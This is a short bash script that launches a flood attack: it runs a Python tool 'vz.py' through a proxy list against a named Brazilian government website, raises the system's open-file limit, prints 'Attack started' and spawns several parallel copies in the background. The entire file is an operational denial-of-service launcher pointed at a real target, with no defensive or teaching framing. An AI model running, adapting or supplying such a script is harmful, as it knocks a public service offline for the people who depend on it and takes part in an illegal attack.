#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python3 vz.py -url https://itacare.ba.gov.br/ -f proxy.txt -v 5 -m head -b 1 -s 60"

#number of process that you want
process=6

#change the system limit
ulimit -n 99999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
